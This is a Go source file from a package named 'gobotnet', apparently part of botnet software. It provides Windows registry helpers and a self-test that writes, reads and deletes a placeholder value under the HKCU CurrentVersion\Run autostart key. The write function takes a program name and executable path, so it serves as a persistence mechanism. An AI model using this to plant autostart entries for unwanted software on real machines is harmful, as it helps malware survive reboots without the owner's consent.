package gobotnet

import (
	"golang.org/x/sys/windows/registry"
)

func RegistryTest() {
	OutMessage("Test Registry Start")

	if !CheckSetValueRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test") {
		OutMessage("CheckSetValueRegistryKey: OK")
	} else {
		OutMessage("CheckSetValueRegistryKey: NOT")
	}

	value, err := GetRegistryKeyValue(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test")
	if !CheckError(err) {
		OutMessage("GetRegistryKeyValue: NOT")
	} else {
		OutMessage("GetRegistryKeyValue: OK")
	}

	WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test", "test_value")
	value, err = GetRegistryKeyValue(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test")
	if CheckError(err) || value != "test_value" {
		OutMessage("WriteRegistryKey: NOT")
	} else {
		OutMessage("WriteRegistryKey: OK")
	}

	if CheckSetValueRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test") {
		OutMessage("CheckSetValueRegistryKey: OK")
	} else {
		OutMessage("CheckSetValueRegistryKey: NOT")
	}

	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test")
	value, err = GetRegistryKeyValue(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, "test")
	if !CheckError(err) || value == "test_value" {
		OutMessage("DeleteRegistryKey: NOT")
	} else {
		OutMessage("DeleteRegistryKey: OK")
	}
	OutMessage("Test Registry End")
}

func GetRegistryKey(typeReg registry.Key, regPath string, access uint32) (key registry.Key, err error) {
	currentKey, err := registry.OpenKey(typeReg, regPath, access)
	return currentKey, err
}

func GetRegistryKeyValue(typeReg registry.Key, regPath, nameKey string) (keyValue string, err error) {
	var value string = ""

	key, err := GetRegistryKey(typeReg, regPath, registry.READ)
	if CheckError(err) {
		return value, err
	}
	defer key.Close()

	value, _, err = key.GetStringValue(nameKey)
	if CheckError(err) {
		return value, err
	}
	return value, nil
}

func CheckSetValueRegistryKey(typeReg registry.Key, regPath, nameValue string) bool {
	currentKey, err := GetRegistryKey(typeReg, regPath, registry.READ)
	if CheckError(err) {
		return false
	}
	defer currentKey.Close()

	_, _, err = currentKey.GetStringValue(nameValue)
	if CheckError(err) {
		return false
	}
	return true
}

func WriteRegistryKey(typeReg registry.Key, regPath, nameProgram, pathToExecFile string) error {
	updateKey, err := GetRegistryKey(typeReg, regPath, registry.WRITE)
	if CheckError(err) {
		return err
	}
	defer updateKey.Close()
	return updateKey.SetStringValue(nameProgram, pathToExecFile)
}

func DeleteRegistryKey(typeReg registry.Key, regPath, nameProgram string) error {
	deleteKey, err := GetRegistryKey(typeReg, regPath, registry.WRITE)
	if CheckError(err) {
		return err
	}
	defer deleteKey.Close()
	return deleteKey.DeleteValue(nameProgram)
}
